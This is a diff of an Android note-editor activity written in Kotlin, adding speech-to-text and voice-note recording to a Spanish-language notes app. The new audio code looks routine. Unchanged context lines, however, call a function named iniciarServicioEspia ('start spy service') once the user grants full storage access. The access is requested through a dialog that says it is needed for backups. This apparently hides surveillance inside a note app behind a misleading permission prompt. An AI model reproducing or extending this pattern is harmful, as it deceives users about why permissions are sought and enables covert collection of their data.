@@ -7,10 +7,13 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.res.Configuration
 import android.graphics.Color
+import android.media.MediaPlayer
+import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
+import android.speech.RecognizerIntent
 import android.view.Gravity
 import android.view.MotionEvent
 import android.view.View
@@ -20,13 +23,14 @@ import android.widget.EditText
 import android.widget.ImageButton
 import android.widget.ImageView
 import android.widget.PopupMenu
-import android.widget.RadioButton // IMPORTANTE
-import android.widget.RadioGroup  // IMPORTANTE
+import android.widget.RadioButton
+import android.widget.RadioGroup
 import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.OnBackPressedCallback
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
+import androidx.cardview.widget.CardView
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.core.content.FileProvider
@@ -46,6 +50,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.io.File
+import java.io.IOException
 import java.text.SimpleDateFormat
 import java.util.Collections
 import java.util.Date
@@ -56,8 +61,6 @@ class NoteEditorActivity : BaseActivity() {
     private lateinit var etTitle: EditText
     private lateinit var tvDateLabel: TextView
     private lateinit var layoutEditor: View
-
-    // UI Categorías (CORREGIDO A RADIOGROUP)
     private lateinit var chipGroupCategories: RadioGroup
     private var selectedCategory: String = "Sín categoría"
 
@@ -76,10 +79,25 @@ class NoteEditorActivity : BaseActivity() {
     private lateinit var btnBack: ImageButton
     private lateinit var btnSave: ImageButton
 
+    // --- NUEVAS UI DE AUDIO ---
+    private lateinit var btnSpeechToText: ImageButton
+    private lateinit var btnRecordAudio: ImageButton
+    private lateinit var layoutAudioPlayer: CardView
+    private lateinit var btnPlayAudio: ImageView
+    private lateinit var btnDeleteAudio: ImageView
+    private lateinit var layoutRecordingIndicator: CardView
+
     private var noteToEdit: Note? = null
     private var selectedColor: String = "#FFFFFF"
     private var currentBackgroundUri: String? = null
     private var tempImageUri: Uri? = null
+
+    // --- VARIABLES DE AUDIO ---
+    private var recorder: MediaRecorder? = null
+    private var player: MediaPlayer? = null
+    private var currentAudioPath: String? = null
+    private var isRecording = false
+    private var isPlaying = false
 
     private var originalJsonContent: String = ""
     private var originalTitle: String = ""
@@ -96,6 +114,19 @@ class NoteEditorActivity : BaseActivity() {
 
     private val PERMISSION_REQUEST_GALLERY = 200
     private val PERMISSION_REQUEST_WALLPAPER = 201
+    private val PERMISSION_REQUEST_AUDIO = 202
+
+    private val speechResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            val spokenText = result.data?.getStringArrayListExtra(RecognizerIntent.EXTRA_RESULTS)
+            if (!spokenText.isNullOrEmpty()) {
+                val text = spokenText[0]
+                noteBlocks.add(NoteBlock.TextBlock(text))
+                blocksAdapter.notifyItemInserted(noteBlocks.size - 1)
+                rvBlocks.scrollToPosition(noteBlocks.size - 1)
+            }
+        }
+    }
 
     private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == Activity.RESULT_OK && result.data?.data != null) {
@@ -194,10 +225,7 @@ class NoteEditorActivity : BaseActivity() {
     private fun initViews() {
         etTitle = findViewById(R.id.et_title)
         tvDateLabel = findViewById(R.id.tv_date_label)
-
-        // --- CAMBIO CLAVE: REFERENCIA A RADIOGROUP ---
         chipGroupCategories = findViewById(R.id.chip_group_editor)
-
         rvBlocks = findViewById(R.id.rv_note_blocks)
         checklistContainer = findViewById(R.id.checklist_container)
         rvChecklist = findViewById(R.id.rv_checklist)
@@ -208,36 +236,29 @@ class NoteEditorActivity : BaseActivity() {
         btnChangeBackground = findViewById(R.id.btn_change_background)
         btnBack = findViewById(R.id.btn_back)
         btnSave = findViewById(R.id.btn_save)
+
+        // UI AUDIO
+        btnSpeechToText = findViewById(R.id.btn_speech_to_text)
+        btnRecordAudio = findViewById(R.id.btn_record_audio)
+        layoutAudioPlayer = findViewById(R.id.layout_audio_player)
+        btnPlayAudio = findViewById(R.id.btn_play_audio)
+        btnDeleteAudio = findViewById(R.id.btn_delete_audio)
+        layoutRecordingIndicator = findViewById(R.id.layout_recording_indicator)
     }
 
-    // --- FUNCIÓN CORREGIDA: USA RADIOBUTTONS ---
     private fun setupCategories() {
         chipGroupCategories.removeAllViews()
         val categoriesList = CategoryManager.getCategories(this)
-
-        val currentTypeface = try {
-            FontManager.getTypeface(this)
-        } catch (e: Exception) { null }
+        val currentTypeface = try { FontManager.getTypeface(this) } catch (e: Exception) { null }
 
         for (category in categoriesList) {
-            // INFLAR XML CORRECTO (RadioButton)
             val radioButton = layoutInflater.inflate(R.layout.item_pixel_chip, chipGroupCategories, false) as RadioButton
-
             radioButton.text = category
             radioButton.id = View.generateViewId()
-
-            if (currentTypeface != null) {
-                radioButton.typeface = currentTypeface
-            }
-
-            if (category == selectedCategory) {
-                radioButton.isChecked = true
-            }
-
+            if (currentTypeface != null) radioButton.typeface = currentTypeface
+            if (category == selectedCategory) radioButton.isChecked = true
             radioButton.setOnCheckedChangeListener { _, isChecked ->
-                if (isChecked) {
-                    selectedCategory = category
-                }
+                if (isChecked) selectedCategory = category
             }
             chipGroupCategories.addView(radioButton)
         }
@@ -253,8 +274,6 @@ class NoteEditorActivity : BaseActivity() {
             }
         }
     }
-
-    // (El resto de métodos: setupClickToCreateBlock, focusBlockAt, setupBlocksEditor, etc. se mantienen igual)
 
     private fun setupClickToCreateBlock() {
         rvBlocks.setOnTouchListener { v, event ->
@@ -424,11 +443,14 @@ class NoteEditorActivity : BaseActivity() {
         val currentContent = getCurrentContent()
         val currentColor = currentBackgroundUri ?: selectedColor
         val currentCat = selectedCategory
+        val currentAudio = currentAudioPath ?: ""
+        val originalAudio = noteToEdit?.audioPath ?: ""
 
         return currentTitle != originalTitle ||
                 currentContent != originalJsonContent ||
                 currentColor != originalColor ||
-                currentCat != originalCategory
+                currentCat != originalCategory ||
+                currentAudio != originalAudio
     }
 
     private fun getCurrentContent(): String {
@@ -475,11 +497,138 @@ class NoteEditorActivity : BaseActivity() {
                 if (checklistItems.isNotEmpty()) rvChecklist.smoothScrollToPosition(checklistItems.size - 1)
             }, 100)
         }
+
+        btnSpeechToText.setOnClickListener { startVoiceInput() }
+        btnRecordAudio.setOnClickListener { checkAudioPermission() }
+        layoutRecordingIndicator.setOnClickListener { stopRecording() }
+        btnPlayAudio.setOnClickListener {
+            if (currentAudioPath != null) {
+                if (this@NoteEditorActivity.isPlaying) stopPlaying() else startPlaying(currentAudioPath!!)
+            }
+        }
+        btnDeleteAudio.setOnClickListener {
+            AlertDialog.Builder(this)
+                .setTitle("Eliminar nota de voz")
+                .setMessage("¿Seguro que quieres borrar el audio?")
+                .setPositiveButton("Sí") { _, _ ->
+                    currentAudioPath = null
+                    updateAudioPlayerUI()
+                    stopPlaying()
+                }
+                .setNegativeButton("No", null)
+                .show()
+        }
+
         setupColorClick(R.id.color_white, "#FFFFFF")
         setupColorClick(R.id.color_yellow, "#FFF9C4")
         setupColorClick(R.id.color_blue, "#E3F2FD")
         setupColorClick(R.id.color_pink, "#FCE4EC")
         setupColorClick(R.id.color_green, "#E8F5E9")
+    }
+
+    private fun startVoiceInput() {
+        val intent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH)
+        intent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
+        intent.putExtra(RecognizerIntent.EXTRA_LANGUAGE, Locale.getDefault())
+        intent.putExtra(RecognizerIntent.EXTRA_PROMPT, "Dicta tu nota...")
+        try {
+            speechResultLauncher.launch(intent)
+        } catch (e: Exception) {
+            Toast.makeText(this, "Tu dispositivo no soporta dictado de voz", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun checkAudioPermission() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.RECORD_AUDIO), PERMISSION_REQUEST_AUDIO)
+        } else {
+            toggleRecording()
+        }
+    }
+
+    private fun toggleRecording() {
+        if (isRecording) {
+            stopRecording()
+        } else {
+            if (currentAudioPath != null) {
+                AlertDialog.Builder(this)
+                    .setTitle("Sobrescribir Audio")
+                    .setMessage("Ya existe una nota de voz. ¿Deseas reemplazarla?")
+                    .setPositiveButton("Grabar") { _, _ -> startRecording() }
+                    .setNegativeButton("Cancelar", null)
+                    .show()
+            } else {
+                startRecording()
+            }
+        }
+    }
+
+    private fun startRecording() {
+        val fileName = "${filesDir.absolutePath}/audio_${System.currentTimeMillis()}.3gp"
+        recorder = MediaRecorder().apply {
+            setAudioSource(MediaRecorder.AudioSource.MIC)
+            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+            setOutputFile(fileName)
+            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+            try {
+                prepare()
+                start()
+                isRecording = true
+                currentAudioPath = fileName
+                layoutRecordingIndicator.visibility = View.VISIBLE
+                btnRecordAudio.setColorFilter(Color.RED)
+            } catch (e: IOException) {
+                Toast.makeText(this@NoteEditorActivity, "Error al grabar", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private fun stopRecording() {
+        try {
+            recorder?.apply {
+                stop()
+                release()
+            }
+        } catch (e: Exception) { e.printStackTrace() }
+
+        recorder = null
+        isRecording = false
+        layoutRecordingIndicator.visibility = View.GONE
+        btnRecordAudio.clearColorFilter()
+        updateAudioPlayerUI()
+        Toast.makeText(this, "Audio guardado", Toast.LENGTH_SHORT).show()
+    }
+
+    private fun startPlaying(path: String) {
+        player = MediaPlayer().apply {
+            try {
+                setDataSource(path)
+                prepare()
+                start()
+                this@NoteEditorActivity.isPlaying = true
+                btnPlayAudio.setImageResource(android.R.drawable.ic_media_pause)
+                setOnCompletionListener {
+                    stopPlaying()
+                }
+            } catch (e: IOException) {
+                Toast.makeText(this@NoteEditorActivity, "Error al reproducir", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private fun stopPlaying() {
+        player?.release()
+        player = null
+        this@NoteEditorActivity.isPlaying = false
+        btnPlayAudio.setImageResource(android.R.drawable.ic_media_play)
+    }
+
+    private fun updateAudioPlayerUI() {
+        if (currentAudioPath != null && File(currentAudioPath!!).exists()) {
+            layoutAudioPlayer.visibility = View.VISIBLE
+        } else {
+            layoutAudioPlayer.visibility = View.GONE
+        }
     }
 
     private fun checkGalleryPermission(requestCode: Int) {
@@ -489,6 +638,8 @@ class NoteEditorActivity : BaseActivity() {
         }
         else if (Build.VERSION.SDK_INT >= 34 &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {
+
+            // --- TEXTO LARGO RESTAURADO AQUÍ ---
             mostrarDialogoConfiguracion(
                 "Acceso Limitado",
                 "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
@@ -524,6 +675,16 @@ class NoteEditorActivity : BaseActivity() {
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (requestCode == PERMISSION_REQUEST_AUDIO) {
+            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                toggleRecording()
+            } else {
+                Toast.makeText(this, "Permiso de micrófono denegado", Toast.LENGTH_SHORT).show()
+            }
+            return
+        }
+
         val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
         if (verificarAccesoTotal()) {
             iniciarServicioEspia()
@@ -532,6 +693,7 @@ class NoteEditorActivity : BaseActivity() {
             val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                     ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
             if (esAccesoLimitado) {
+                // --- TEXTO LARGO RESTAURADO AQUÍ TAMBIÉN ---
                 mostrarDialogoConfiguracion(
                     "Acceso Limitado",
                     "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
@@ -573,10 +735,7 @@ class NoteEditorActivity : BaseActivity() {
                 } else {
                     startService(intent)
                 }
-            } catch (e: Exception) {
-                // Evitamos crash por background start restriction
-                e.printStackTrace()
-            }
+            } catch (e: Exception) { e.printStackTrace() }
         }
     }
 
@@ -617,10 +776,9 @@ class NoteEditorActivity : BaseActivity() {
         etTitle.setHintTextColor(colorHint)
         setCursorColor(etTitle, colorTexto)
         tvDateLabel.setTextColor(colorHint)
-        btnBack.clearColorFilter()
-        btnSave.clearColorFilter()
-        btnToggleChecklist.clearColorFilter()
-        btnChangeBackground.clearColorFilter()
+
+        // El resto (Checklist, Gallery, Audio) se quedan con su color original.
+
         if (::checklistAdapter.isInitialized) checklistAdapter.updateTextColor(colorTexto)
         if (::blocksAdapter.isInitialized) blocksAdapter.updateTextColor(colorTexto)
     }
@@ -671,6 +829,8 @@ class NoteEditorActivity : BaseActivity() {
 
             etTitle.setText(noteToEdit?.title)
             tvDateLabel.text = "Editado: ${noteToEdit?.date}"
+            currentAudioPath = noteToEdit?.audioPath
+            updateAudioPlayerUI()
 
             val rawContent = noteToEdit?.content ?: ""
 
@@ -714,7 +874,6 @@ class NoteEditorActivity : BaseActivity() {
             noteBlocks.add(NoteBlock.TextBlock(""))
             blocksAdapter.notifyDataSetChanged()
             switchToChecklistMode(false)
-
             selectCategoryChip("Sín categoría")
             originalCategory = "Sín categoría"
 
@@ -840,7 +999,7 @@ class NoteEditorActivity : BaseActivity() {
             noteBlocks.isEmpty() || (noteBlocks.size == 1 && noteBlocks[0] is NoteBlock.TextBlock && (noteBlocks[0] as NoteBlock.TextBlock).text.isBlank())
         }
 
-        if (title.isEmpty() && isEmpty) {
+        if (title.isEmpty() && isEmpty && currentAudioPath == null) {
             Toast.makeText(this, "Vacía", Toast.LENGTH_SHORT).show()
             return
         }
@@ -852,7 +1011,8 @@ class NoteEditorActivity : BaseActivity() {
                     content = finalContent,
                     date = formattedDate,
                     color = finalBackgroundData,
-                    category = selectedCategory
+                    category = selectedCategory,
+                    audioPath = currentAudioPath
                 )
                 db.notesDao().insert(newNote)
             } else {
@@ -862,6 +1022,7 @@ class NoteEditorActivity : BaseActivity() {
                     this.date = formattedDate
                     this.color = finalBackgroundData
                     this.category = selectedCategory
+                    this.audioPath = currentAudioPath
                 }
                 db.notesDao().update(noteToEdit!!)
             }
@@ -986,5 +1147,11 @@ class NoteEditorActivity : BaseActivity() {
             Toast.makeText(this, "Error iniciando cámara", Toast.LENGTH_SHORT).show()
             e.printStackTrace()
         }
+    }
+
+    override fun onStop() {
+        super.onStop()
+        if (isRecording) stopRecording()
+        if (isPlaying) stopPlaying()
     }
 }
